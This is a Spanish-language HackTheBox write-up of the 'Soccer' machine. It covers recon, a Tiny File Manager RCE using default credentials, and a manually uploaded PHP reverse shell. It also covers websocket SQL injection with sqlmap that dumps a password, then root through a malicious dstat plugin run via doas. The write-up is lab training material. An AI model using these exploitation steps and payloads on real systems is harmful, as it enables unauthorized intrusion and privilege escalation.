# Soccer - HackTheBox

**Fecha de resolución:** 2 de octubre de 2026

Máquina Linux, IP 10.129.66.54.

## Reconocimiento

Escaneo completo de puertos:

```
nmap --privileged -p- --min-rate 5000 -n -vvv -sS -oG allPorts 10.129.66.54
```

Tres puertos abiertos: 22, 80 y 9091. Escaneo de versión sobre esos tres (`scan.txt`):

```
nmap -p22,80,9091 10.129.66.54 -sS -sCV -n -oN targets
```

- 22: OpenSSH 8.2p1 (Ubuntu).
- 80: nginx 1.18.0, redirige a `http://soccer.htb/`.
- 9091: nmap no reconoce el servicio y lo etiqueta como `xmltec-xmlmail` solo por el fingerprint; en realidad responde con cabeceras HTTP sueltas (`400 Bad Request` a peticiones sin sentido, `404 Not Found` a `GET`/`OPTIONS`).

Añadí `soccer.htb` a `/etc/hosts`.

Probé `searchsploit` contra la etiqueta `xmltec-xmlmail` que puso nmap, sin resultados (es solo el nombre que nmap le da a un fingerprint no identificado, no software real). Intenté además tratar el puerto 9091 como un directorio web normal con gobuster y conectarme a mano con `nc soccer.htb 9091` enviando `help`; en ambos casos solo volvió la misma respuesta `400 Bad Request` sin más información, así que de momento lo dejé de lado.

Un `gobuster vhost` contra `soccer.htb` con el wordlist `subdomains-top1million-5000.txt` no encontró ningún otro vhost en esta fase (el segundo vhost de la máquina solo apareció más adelante, leyendo la configuración de nginx ya con shell). Probé también un path traversal directo contra el puerto 80 (`curl http://soccer.htb/../../../../../../etc/passwd`), que solo devolvió el 404 por defecto de nginx.

Fuzzing de directorios sobre el sitio principal:

```
gobuster dir -u http://soccer.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak
```

```
tiny    (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

## Tiny File Manager - RCE (CVE-2021-40964)

`/tiny/` es Tiny File Manager. `searchsploit` sobre "tiny file" localizó `50828.sh` (Tiny File Manager 2.4.6 - RCE, CVE-2021-40964/CVE-2021-45010), que inicia sesión con las credenciales por defecto de la herramienta (`admin`/`admin@123`) y abusa de la subida de archivos para dejar una webshell en PHP.

Copié el exploit con `searchsploit -m`. La primera ejecución falló con `Syntax error: Bad function name`: el script usa sintaxis de bash pero se estaba invocando con el intérprete `sh` por defecto. Lo arreglé llamándolo explícitamente con `bash ./50828.sh`.

El primer intento con bash, apuntando a `http://soccer.htb/tiny` (sin barra final), falló del todo: el login no devolvió cookie, `jq` lanzó un error de parseo al intentar leer la fuga de webroot, y la subida se abortó. Repitiéndolo con la barra final (`http://soccer.htb/tiny/`) el login sí funcionó con las credenciales por defecto (cookie obtenida) y el bug de full path disclosure del propio script reveló el webroot real (`/var/www/html/tiny/`), pero la subida automática del script seguía fallando ("File Upload Unsuccessful").

Como la subida automatizada no funcionaba, subí a mano una reverse shell en PHP (`shell.php`) a través del propio panel de Tiny File Manager (ya autenticado con `admin`/`admin@123`), reutilizando una copia de la `php-reverse-shell.php` clásica de pentestmonkey apuntada a mi IP y al puerto 4444. Levanté un listener con Penelope y accedí al archivo subido para disparar la conexión:

```
penelope
```

Sesión recibida como `www-data`, con PTY mejorado automáticamente vía `/usr/bin/python3`.

## Shell como www-data

`whoami` confirmó `www-data`. `netstat -tnlp` mostró, además de 22/80/9091 escuchando en todas las interfaces, varios servicios solo en localhost: 3000 (una app Node, luego identificada como la que hay detrás del segundo vhost), y 3306/33060 (MySQL). Probé el cliente `mysql` directamente sin credenciales; acceso denegado para `www-data@localhost`, sin nada que probar ahí.

Leí la configuración de nginx:

```
cat /etc/nginx/sites-available/default
```

Tenía dos bloques `server`: el que sirve `soccer.htb` desde `/var/www/html` (Tiny File Manager), y uno segundo para `soc-player.soccer.htb` que hace proxy a `http://localhost:3000` con las cabeceras `Upgrade`/`Connection` propias de websockets, con `root /root/app/views`.

Añadí `soc-player.soccer.htb` a `/etc/hosts` para poder llegar a ese vhost desde fuera, que es el que da la cara al puerto 9091.

## Inyección SQL sobre el websocket (soc-player.soccer.htb:9091)

Antes de montar sqlmap comprobé que soportaba websockets (`sqlmap -h | grep websocket`). Al lanzarlo directamente:

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch
```

falló con un error crítico: sqlmap necesita el módulo de terceros `websocket-client`. `pip install websocket-client` no funcionó por el entorno de Python gestionado externamente en Kali; lo instalé en su lugar con `sudo apt install python3-websocket`.

Con eso sqlmap confirmó el parámetro JSON `id` inyectable (boolean-based blind por `OR` y time-based blind con `SLEEP` sobre MySQL, UNION con 3 columnas), backend MySQL >= 8.0.0. Tuve que repetir la ejecución varias veces añadiendo `--level 5 --risk 3 --threads 10` y en algún punto `--flush-session` porque quedaban resultados de sesión a medias de los primeros intentos. Enumeré la base de datos paso a paso:

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 --dbs
sqlmap ... -D soccer_db --tables
sqlmap ... -D soccer_db -T accounts --columns
sqlmap ... -D soccer_db -T accounts --dump
```

Una sola base de datos (`soccer_db`), una sola tabla (`accounts`), columnas `id, email, password, username`. El dump devolvió una única fila:

```
id,email,password,username
1324,player@player.htb,PlayerOftheMatch2022,player
```

## Shell como player

```
ssh player@soccer.htb
```

con esa contraseña entró directamente. `user.txt` estaba en el home.

`sudo -l` pidió una contraseña que no tenía y, tras fallarla, confirmó que `player` no puede ejecutar nada con sudo en esta máquina. `crontab -l` vacío. Revisé `/etc/cron.d`: solo las entradas estándar de Ubuntu (`e2scrub_all`, `php`, `popularity-contest`), todas propiedad de root y no escribibles.

`find / -perm -04000 2>/dev/null` listó los SUID habituales más uno que no pertenece a una instalación estándar de Ubuntu: `/usr/local/bin/doas`, con bit SUID puesto.

## Escalada a root (doas + plugin de dstat)

`doas -u root /bin/sh` devolvió `Operation not permitted`: no había configuración en la ruta por defecto `/etc/doas.conf`. La localicé con:

```
find / -type f -name "doas.conf" 2>/dev/null
```

```
/usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

`doas -u root dstat --yolo`, probando una opción inventada, solo devolvió el propio error de `dstat` de opción no reconocida; usar la ruta completa (`/usr/bin/dstat --yolo`) tampoco cambiaba nada.

`dstat` carga plugins de terceros por nombre desde varias rutas fijas, una de ellas `/usr/local/share/dstat/`, buscando un archivo `dstat_<nombre>.py` y activándolo con `--<nombre>`. Escribí un plugin malicioso:

```python
import os
os.system("/bin/bash")
```

El primer intento de guardarlo directamente como `dstat_yolo.py` en el home de `player` falló por permisos (directorio no escribible); lo guardé en `/tmp` y de ahí lo copié a `/usr/local/share/dstat/dstat_yolo.py`, que sí era escribible por `player`. Con el plugin en su sitio:

```
doas /usr/bin/dstat --yolo
```

El plugin se cargó dentro del proceso elevado por `doas` y lanzó una shell de bash como root.

`cat root.txt` dio la flag. En `/root` había también un `run.sql` con una única línea:

```sql
delete from soccer_db.accounts where id != 1324;
```

la query que la propia app de marcador usa para resetear la tabla `accounts` a la fila única del jugador, lo que explica por qué el dump de sqlmap solo devolvió ese registro.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
